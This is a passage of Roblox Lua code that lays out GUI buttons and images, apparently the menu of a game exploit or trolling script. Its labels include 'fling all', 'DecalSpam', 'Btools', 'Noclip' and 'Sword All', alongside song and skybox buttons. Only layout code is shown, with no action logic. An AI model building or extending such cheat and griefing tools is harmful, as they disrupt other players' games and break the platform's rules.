		jeje_2.Position = UDim2.new(-0.0616302192, 0, 0.660000026, 0)
		jeje_2.Size = UDim2.new(0, 313, 0, 45)
		jeje_2.Image = "rbxassetid://113514712010253"
	
		b_13.Name = "b"
		b_13.Parent = r
		b_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_13.Position = UDim2.new(0.383601964, 0, 1.81015134, 0)
		b_13.Size = UDim2.new(0, 98, 0, 29)
		b_13.Font = Enum.Font.Roboto
		b_13.Text = "biggify"
		b_13.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_13.TextScaled = true
		b_13.TextSize = 14.000
		b_13.TextWrapped = true
	
		b_14.Name = "b"
		b_14.Parent = r
		b_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_14.Position = UDim2.new(-0.0845165849, 0, 7.9403944, 0)
		b_14.Size = UDim2.new(0, 98, 0, 29)
		b_14.Font = Enum.Font.Roboto
		b_14.Text = "fling all"
		b_14.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_14.TextScaled = true
		b_14.TextSize = 14.000
		b_14.TextWrapped = true
	
		b_15.Name = "b"
		b_15.Parent = r
		b_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_15.Position = UDim2.new(1.07834077, 0, 5.15199566, 0)
		b_15.Size = UDim2.new(0, 98, 0, 29)
		b_15.Font = Enum.Font.Roboto
		b_15.Text = "Skybox"
		b_15.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_15.TextScaled = true
		b_15.TextSize = 14.000
		b_15.TextWrapped = true
	
		b_16.Name = "b"
		b_16.Parent = r
		b_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_16.Position = UDim2.new(1.0791105, 0, 4.32771015, 0)
		b_16.Size = UDim2.new(0, 98, 0, 29)
		b_16.Font = Enum.Font.Roboto
		b_16.Text = "DecalSpam 2"
		b_16.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_16.TextScaled = true
		b_16.TextSize = 14.000
		b_16.TextWrapped = true
	
		b_17.Name = "b"
		b_17.Parent = r
		b_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_17.Position = UDim2.new(0.372220039, 0, 3.50293589, 0)
		b_17.Size = UDim2.new(0, 98, 0, 29)
		b_17.Font = Enum.Font.Roboto
		b_17.Text = "Duckify"
		b_17.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_17.TextScaled = true
		b_17.TextSize = 14.000
		b_17.TextWrapped = true
	
		b_18.Name = "b"
		b_18.Parent = r
		b_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_18.Position = UDim2.new(0.375256509, 0, 7.92390728, 0)
		b_18.Size = UDim2.new(0, 98, 0, 29)
		b_18.Font = Enum.Font.Roboto
		b_18.Text = "DecalSpam"
		b_18.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_18.TextScaled = true
		b_18.TextSize = 14.000
		b_18.TextWrapped = true
	
		b_19.Name = "b"
		b_19.Parent = r
		b_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_19.Position = UDim2.new(0.150605276, 0, 2.66957831, 0)
		b_19.Size = UDim2.new(0, 98, 0, 29)
		b_19.Font = Enum.Font.Roboto
		b_19.Text = "Disco"
		b_19.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_19.TextScaled = true
		b_19.TextSize = 14.000
		b_19.TextWrapped = true
	
		b_20.Name = "b"
		b_20.Parent = r
		b_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_20.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_20.Position = UDim2.new(0.150830731, 0, 4.33002806, 0)
		b_20.Size = UDim2.new(0, 98, 0, 29)
		b_20.Font = Enum.Font.Roboto
		b_20.Text = "Hint"
		b_20.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_20.TextScaled = true
		b_20.TextSize = 14.000
		b_20.TextWrapped = true
	
		b_21.Name = "b"
		b_21.Parent = r
		b_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_21.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_21.Position = UDim2.new(0.151014566, 0, 7.93665171, 0)
		b_21.Size = UDim2.new(0, 98, 0, 29)
		b_21.Font = Enum.Font.Roboto
		b_21.Text = "fly"
		b_21.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_21.TextScaled = true
		b_21.TextSize = 14.000
		b_21.TextWrapped = true
	
		b_22.Name = "b"
		b_22.Parent = r
		b_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_22.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_22.Position = UDim2.new(1.0791105, 0, 3.52281117, 0)
		b_22.Size = UDim2.new(0, 98, 0, 29)
		b_22.Font = Enum.Font.Roboto
		b_22.Text = "Btools"
		b_22.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_22.TextScaled = true
		b_22.TextSize = 14.000
		b_22.TextWrapped = true
	
		b_23.Name = "b"
		b_23.Parent = r
		b_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_23.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_23.Position = UDim2.new(0.153139994, 0, 3.50818539, 0)
		b_23.Size = UDim2.new(0, 98, 0, 29)
		b_23.Font = Enum.Font.Roboto
		b_23.Text = "billboard"
		b_23.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_23.TextScaled = true
		b_23.TextSize = 14.000
		b_23.TextWrapped = true
	
		b_24.Name = "b"
		b_24.Parent = r
		b_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_24.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_24.Position = UDim2.new(0.378611863, 0, 2.63483024, 0)
		b_24.Size = UDim2.new(0, 98, 0, 29)
		b_24.Font = Enum.Font.Roboto
		b_24.Text = "r6 others"
		b_24.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_24.TextScaled = true
		b_24.TextSize = 14.000
		b_24.TextWrapped = true
	
		b_25.Name = "b"
		b_25.Parent = r
		b_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_25.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_25.Position = UDim2.new(0.150605276, 0, 1.80147457, 0)
		b_25.Size = UDim2.new(0, 98, 0, 29)
		b_25.Font = Enum.Font.Roboto
		b_25.Text = "R15 ALL"
		b_25.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_25.TextScaled = true
		b_25.TextSize = 14.000
		b_25.TextWrapped = true
	
		b_26.Name = "b"
		b_26.Parent = r
		b_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_26.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_26.Position = UDim2.new(-0.0798358619, 0, 4.34739017, 0)
		b_26.Size = UDim2.new(0, 98, 0, 29)
		b_26.Font = Enum.Font.Roboto
		b_26.Text = "Message"
		b_26.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_26.TextScaled = true
		b_26.TextSize = 14.000
		b_26.TextWrapped = true
	
		b_27.Name = "b"
		b_27.Parent = r
		b_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_27.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_27.Position = UDim2.new(0.845344067, 0, 4.31325626, 0)
		b_27.Size = UDim2.new(0, 98, 0, 29)
		b_27.Font = Enum.Font.Roboto
		b_27.Text = "Sword All"
		b_27.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_27.TextScaled = true
		b_27.TextSize = 14.000
		b_27.TextWrapped = true
	
		b_28.Name = "b"
		b_28.Parent = r
		b_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_28.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_28.Position = UDim2.new(0.375460625, 0, 7.03848124, 0)
		b_28.Size = UDim2.new(0, 98, 0, 29)
		b_28.Font = Enum.Font.Roboto
		b_28.Text = "Dog all"
		b_28.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_28.TextScaled = true
		b_28.TextSize = 14.000
		b_28.TextWrapped = true
	
		b_29.Name = "b"
		b_29.Parent = r
		b_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_29.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_29.Position = UDim2.new(-0.0798566118, 0, 3.52816892, 0)
		b_29.Size = UDim2.new(0, 98, 0, 29)
		b_29.Font = Enum.Font.Roboto
		b_29.Text = "Noclip"
		b_29.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_29.TextScaled = true
		b_29.TextSize = 14.000
		b_29.TextWrapped = true
	
		b_30.Name = "b"
		b_30.Parent = r
		b_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_30.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_30.Position = UDim2.new(-0.0814167708, 0, 2.67481375, 0)
		b_30.Size = UDim2.new(0, 98, 0, 29)
		b_30.Font = Enum.Font.Roboto
		b_30.Text = "Trippy Skybox"
		b_30.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_30.TextScaled = true
		b_30.TextSize = 14.000
		b_30.TextWrapped = true
	
		b_31.Name = "b"
		b_31.Parent = r
		b_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_31.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_31.Position = UDim2.new(-0.0819819272, 0, 6.12113667, 0)
		b_31.Size = UDim2.new(0, 98, 0, 29)
		b_31.Font = Enum.Font.Roboto
		b_31.Text = "Poo poo test skybox"
		b_31.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_31.TextScaled = true
		b_31.TextSize = 14.000
		b_31.TextWrapped = true
	
		b_32.Name = "b"
		b_32.Parent = r
		b_32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_32.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_32.Position = UDim2.new(0.151014566, 0, 6.12113667, 0)
		b_32.Size = UDim2.new(0, 98, 0, 29)
		b_32.Font = Enum.Font.Roboto
		b_32.Text = "zero two"
		b_32.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_32.TextScaled = true
		b_32.TextSize = 14.000
		b_32.TextWrapped = true
	
		b_33.Name = "b"
		b_33.Parent = r
		b_33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_33.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_33.Position = UDim2.new(0.381680876, 0, 6.12113667, 0)
		b_33.Size = UDim2.new(0, 98, 0, 29)
		b_33.Font = Enum.Font.Roboto
		b_33.Text = "RETURNS SKYBOX"
		b_33.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_33.TextScaled = true
		b_33.TextSize = 14.000
		b_33.TextWrapped = true
	
		jeje_3.Name = "jeje"
		jeje_3.Parent = r
		jeje_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		jeje_3.BackgroundTransparency = 1.000
		jeje_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
		jeje_3.BorderSizePixel = 0
		jeje_3.Position = UDim2.new(0.0298210736, 0, 9.72000027, 0)
		jeje_3.Size = UDim2.new(0, 222, 0, 39)
		jeje_3.Image = "rbxassetid://121329478289353"
	
		b_34.Name = "b"
		b_34.Parent = r
		b_34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_34.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_34.Position = UDim2.new(0.149256796, 0, 8.80008411, 0)
		b_34.Size = UDim2.new(0, 98, 0, 29)
		b_34.Font = Enum.Font.Roboto
		b_34.Text = "Sparkle f3x"
		b_34.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_34.TextScaled = true
		b_34.TextSize = 14.000
		b_34.TextWrapped = true
	
		b_35.Name = "b"
		b_35.Parent = r
		b_35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_35.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_35.Position = UDim2.new(0.845916331, 0, 6.10008526, 0)
		b_35.Size = UDim2.new(0, 98, 0, 29)
		b_35.Font = Enum.Font.Roboto
		b_35.Text = "Smoke f3x"
		b_35.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_35.TextScaled = true
		b_35.TextSize = 14.000
		b_35.TextWrapped = true
	
		b_36.Name = "b"
		b_36.Parent = r
		b_36.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_36.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_36.Position = UDim2.new(-0.079522863, 0, 18.4400005, 0)
		b_36.Size = UDim2.new(0, 98, 0, 29)
		b_36.Font = Enum.Font.Roboto
		b_36.Text = "EVERY END GD"
		b_36.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_36.TextScaled = true
		b_36.TextSize = 14.000
		b_36.TextWrapped = true
	
		b_37.Name = "b"
		b_37.Parent = r
		b_37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_37.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_37.Position = UDim2.new(-0.0852743611, 0, 8.81199551, 0)
		b_37.Size = UDim2.new(0, 98, 0, 29)
		b_37.Font = Enum.Font.Roboto
		b_37.Text = "Skybox 2"
		b_37.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_37.TextScaled = true
		b_37.TextSize = 14.000
		b_37.TextWrapped = true
	
		e_2.Name = "e"
		e_2.Parent = r
		e_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_2.Position = UDim2.new(0.15506959, 0, 10.7799997, 0)
		e_2.Size = UDim2.new(0, 97, 0, 28)
		e_2.Font = Enum.Font.Roboto
		e_2.Text = "bad apple p1"
		e_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_2.TextScaled = true
		e_2.TextSize = 14.000
		e_2.TextWrapped = true
	
		e_3.Name = "e"
		e_3.Parent = r
		e_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_3.Position = UDim2.new(-0.0775347948, 0, 10.7799997, 0)
		e_3.Size = UDim2.new(0, 97, 0, 28)
		e_3.Font = Enum.Font.Roboto
		e_3.Text = "bad apple p2"
		e_3.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_3.TextScaled = true
		e_3.TextSize = 14.000
		e_3.TextWrapped = true
	
		e_4.Name = "e"
		e_4.Parent = r
		e_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_4.Position = UDim2.new(0.153980777, 0, 11.6013699, 0)
		e_4.Size = UDim2.new(0, 97, 0, 28)
		e_4.Font = Enum.Font.Roboto
		e_4.Text = "teto territory"
		e_4.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_4.TextScaled = true
		e_4.TextSize = 14.000
		e_4.TextWrapped = true
	
		e_5.Name = "e"
		e_5.Parent = r
		e_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_5.Position = UDim2.new(0.382859588, 0, 14.9794922, 0)
		e_5.Size = UDim2.new(0, 97, 0, 28)
		e_5.Font = Enum.Font.Roboto
		e_5.Text = "blood pop p1"
		e_5.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_5.TextScaled = true
		e_5.TextSize = 14.000
		e_5.TextWrapped = true
	
		e_6.Name = "e"
		e_6.Parent = r
		e_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_6.Position = UDim2.new(-0.0775347948, 0, 20.2800007, 0)
		e_6.Size = UDim2.new(0, 97, 0, 28)
		e_6.Font = Enum.Font.Roboto
		e_6.Text = "yea"
		e_6.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_6.TextScaled = true
		e_6.TextSize = 14.000
		e_6.TextWrapped = true
	
		e_7.Name = "e"
		e_7.Parent = r
		e_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_7.Position = UDim2.new(-0.0811634138, 0, 17.5773907, 0)
		e_7.Size = UDim2.new(0, 97, 0, 28)
		e_7.Font = Enum.Font.Roboto
		e_7.Text = "Kerosene"
		e_7.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_7.TextScaled = true
		e_7.TextSize = 14.000
		e_7.TextWrapped = true
	
		e_8.Name = "e"
		e_8.Parent = r
		e_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_8.Position = UDim2.new(0.381102055, 0, 15.8566923, 0)
		e_8.Size = UDim2.new(0, 97, 0, 28)
		e_8.Font = Enum.Font.Roboto
		e_8.Text = "jumpztyle"
		e_8.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_8.TextScaled = true
		e_8.TextSize = 14.000
		e_8.TextWrapped = true
	
		e_9.Name = "e"
		e_9.Parent = r
		e_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_9.Position = UDim2.new(0.15506959, 0, 20.2800007, 0)
		e_9.Size = UDim2.new(0, 97, 0, 28)
		e_9.Font = Enum.Font.Roboto
		e_9.Text = "yaai"
		e_9.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_9.TextScaled = true
		e_9.TextSize = 14.000
		e_9.TextWrapped = true
	
		e_10.Name = "e"
		e_10.Parent = r
		e_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_10.Position = UDim2.new(0.150083631, 0, 17.557394, 0)
		e_10.Size = UDim2.new(0, 97, 0, 28)
		e_10.Font = Enum.Font.Roboto
		e_10.Text = "audio big collab"
		e_10.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_10.TextScaled = true
		e_10.TextSize = 14.000
		e_10.TextWrapped = true
	
		e_11.Name = "e"
		e_11.Parent = r
		e_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_11.Position = UDim2.new(0.382249713, 0, 12.3813696, 0)
		e_11.Size = UDim2.new(0, 97, 0, 28)
		e_11.Font = Enum.Font.Roboto
		e_11.Text = "AH?AH! (not my audio)"
		e_11.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_11.TextScaled = true
		e_11.TextSize = 14.000
		e_11.TextWrapped = true
	
		e_12.Name = "e"
		e_12.Parent = r
		e_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_12.Position = UDim2.new(0.385685891, 0, 20.2800007, 0)
		e_12.Size = UDim2.new(0, 97, 0, 28)
		e_12.Font = Enum.Font.Roboto
		e_12.Text = "sus"
		e_12.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_12.TextScaled = true
		e_12.TextSize = 14.000
		e_12.TextWrapped = true
	
		e_13.Name = "e"
		e_13.Parent = r
		e_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_13.Position = UDim2.new(-0.0811634138, 0, 15.8914824, 0)
		e_13.Size = UDim2.new(0, 97, 0, 28)
		e_13.Font = Enum.Font.Roboto
		e_13.Text = "Memories idk"
		e_13.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_13.TextScaled = true
		e_13.TextSize = 14.000
		e_13.TextWrapped = true
	
		e_14.Name = "e"
		e_14.Parent = r
		e_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_14.Position = UDim2.new(-0.0805973485, 0, 11.6114807, 0)
		e_14.Size = UDim2.new(0, 97, 0, 28)
		e_14.Font = Enum.Font.Roboto
		e_14.Text = "i got a glock in my rarri"
		e_14.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_14.TextScaled = true
		e_14.TextSize = 14.000
		e_14.TextWrapped = true
	
		e_15.Name = "e"
		e_15.Parent = r
		e_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_15.Position = UDim2.new(0.150270492, 0, 15.8914824, 0)
		e_15.Size = UDim2.new(0, 97, 0, 28)
		e_15.Font = Enum.Font.Roboto
		e_15.Text = "body rollz"
		e_15.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_15.TextScaled = true
		e_15.TextSize = 14.000
		e_15.TextWrapped = true
	
		e_16.Name = "e"
		e_16.Parent = r
		e_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_16.Position = UDim2.new(0.150083631, 0, 16.751482, 0)
		e_16.Size = UDim2.new(0, 97, 0, 28)
		e_16.Font = Enum.Font.Roboto
		e_16.Text = "cooking by the book "
		e_16.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_16.TextScaled = true
		e_16.TextSize = 14.000
		e_16.TextWrapped = true
	
		e_17.Name = "e"
		e_17.Parent = r
		e_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_17.Position = UDim2.new(0.151052311, 0, 14.9914818, 0)
		e_17.Size = UDim2.new(0, 97, 0, 28)
		e_17.Font = Enum.Font.Roboto
		e_17.Text = "w"
		e_17.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_17.TextScaled = true
		e_17.TextSize = 14.000
		e_17.TextWrapped = true
	
		e_18.Name = "e"
		e_18.Parent = r
		e_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_18.Position = UDim2.new(-0.0813398436, 0, 16.7413692, 0)
		e_18.Size = UDim2.new(0, 97, 0, 28)
		e_18.Font = Enum.Font.Roboto
		e_18.Text = "pls stop"
		e_18.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_18.TextScaled = true
		e_18.TextSize = 14.000
		e_18.TextWrapped = true
	
		e_19.Name = "e"
		e_19.Parent = r
		e_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_19.Position = UDim2.new(0.383697808, 0, 19.3799992, 0)
		e_19.Size = UDim2.new(0, 97, 0, 28)
		e_19.Font = Enum.Font.Roboto
		e_19.Text = "bobby2pistolz"
		e_19.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_19.TextScaled = true
		e_19.TextSize = 14.000
		e_19.TextWrapped = true
	
		e_20.Name = "e"
		e_20.Parent = r
		e_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_20.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_20.Position = UDim2.new(-0.0811634138, 0, 14.9940586, 0)
		e_20.Size = UDim2.new(0, 97, 0, 28)
		e_20.Font = Enum.Font.Roboto
		e_20.Text = "creeepers"
		e_20.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_20.TextScaled = true
		e_20.TextSize = 14.000
		e_20.TextWrapped = true
	
		e_21.Name = "e"
		e_21.Parent = r
		e_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_21.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_21.Position = UDim2.new(0.15506959, 0, 19.3799992, 0)
		e_21.Size = UDim2.new(0, 97, 0, 28)
		e_21.Font = Enum.Font.Roboto
		e_21.Text = "tripaloski"
		e_21.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_21.TextScaled = true
		e_21.TextSize = 14.000
		e_21.TextWrapped = true
	
		e_22.Name = "e"
		e_22.Parent = r
		e_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_22.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_22.Position = UDim2.new(0.153159291, 0, 14.0740585, 0)
		e_22.Size = UDim2.new(0, 97, 0, 28)
		e_22.Font = Enum.Font.Roboto
		e_22.Text = "lotsa spaghetti remix 2"
		e_22.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_22.TextScaled = true
		e_22.TextSize = 14.000
		e_22.TextWrapped = true
	
		e_23.Name = "e"
		e_23.Parent = r
		e_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_23.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_23.Position = UDim2.new(-0.0799903944, 0, 14.0740585, 0)
		e_23.Size = UDim2.new(0, 97, 0, 28)
		e_23.Font = Enum.Font.Roboto
		e_23.Text = "memorycardz yabujin"
		e_23.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_23.TextScaled = true
		e_23.TextSize = 14.000
		e_23.TextWrapped = true
	
		e_24.Name = "e"
		e_24.Parent = r
		e_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_24.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_24.Position = UDim2.new(0.383430749, 0, 14.0740585, 0)
		e_24.Size = UDim2.new(0, 97, 0, 28)
		e_24.Font = Enum.Font.Roboto
		e_24.Text = "saxophone guy"
		e_24.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_24.TextScaled = true
		e_24.TextSize = 14.000
		e_24.TextWrapped = true
	
		e_25.Name = "e"
		e_25.Parent = r
		e_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_25.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_25.Position = UDim2.new(-0.0775347948, 0, 19.3799992, 0)
		e_25.Size = UDim2.new(0, 97, 0, 28)
		e_25.Font = Enum.Font.Roboto
		e_25.Text = "sesame trap"
		e_25.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_25.TextScaled = true
		e_25.TextSize = 14.000
		e_25.TextWrapped = true
	
		e_26.Name = "e"
		e_26.Parent = r
		e_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_26.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_26.Position = UDim2.new(0.154684201, 0, 12.3839464, 0)
		e_26.Size = UDim2.new(0, 97, 0, 28)
		e_26.Font = Enum.Font.Roboto
		e_26.Text = "xxd"
		e_26.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_26.TextScaled = true
		e_26.TextSize = 14.000
		e_26.TextWrapped = true
	
		e_27.Name = "e"
		e_27.Parent = r
		e_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_27.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_27.Position = UDim2.new(0.385685891, 0, 18.4400005, 0)
		e_27.Size = UDim2.new(0, 97, 0, 28)
		e_27.Font = Enum.Font.Roboto
		e_27.Text = "mom is kinda homeless 2"
		e_27.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_27.TextScaled = true
		e_27.TextSize = 14.000
		e_27.TextWrapped = true
	
		e_28.Name = "e"
		e_28.Parent = r
		e_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_28.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_28.Position = UDim2.new(0.384706289, 0, 13.1432457, 0)
		e_28.Size = UDim2.new(0, 97, 0, 28)
		e_28.Font = Enum.Font.Roboto
		e_28.Text = "idfk"
		e_28.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_28.TextScaled = true
		e_28.TextSize = 14.000
		e_28.TextWrapped = true
	
		e_29.Name = "e"
		e_29.Parent = r
		e_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_29.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_29.Position = UDim2.new(0.153941348, 0, 13.1439466, 0)
		e_29.Size = UDim2.new(0, 97, 0, 28)
		e_29.Font = Enum.Font.Roboto
		e_29.Text = "Sparta!"
		e_29.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_29.TextScaled = true
		e_29.TextSize = 14.000
		e_29.TextWrapped = true
	
		e_30.Name = "e"
		e_30.Parent = r
		e_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_30.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_30.Position = UDim2.new(-0.0784079731, 0, 12.3862209, 0)
		e_30.Size = UDim2.new(0, 97, 0, 28)
		e_30.Font = Enum.Font.Roboto
		e_30.Text = "Subway 6ists"
		e_30.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_30.TextScaled = true
		e_30.TextSize = 14.000
		e_30.TextWrapped = true
	
		e_31.Name = "e"
		e_31.Parent = r
		e_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_31.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_31.Position = UDim2.new(-0.0778661743, 0, 13.1510324, 0)
		e_31.Size = UDim2.new(0, 97, 0, 28)
		e_31.Font = Enum.Font.Roboto
		e_31.Text = "hoodtrap"
		e_31.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_31.TextScaled = true
		e_31.TextSize = 14.000
		e_31.TextWrapped = true
	
		e_32.Name = "e"
		e_32.Parent = r
		e_32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_32.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_32.Position = UDim2.new(0, 193, 0, 877)
		e_32.Size = UDim2.new(0, 97, 0, 28)
		e_32.Font = Enum.Font.Roboto
		e_32.Text = "CARAMELLDANSEN x i dontlike"
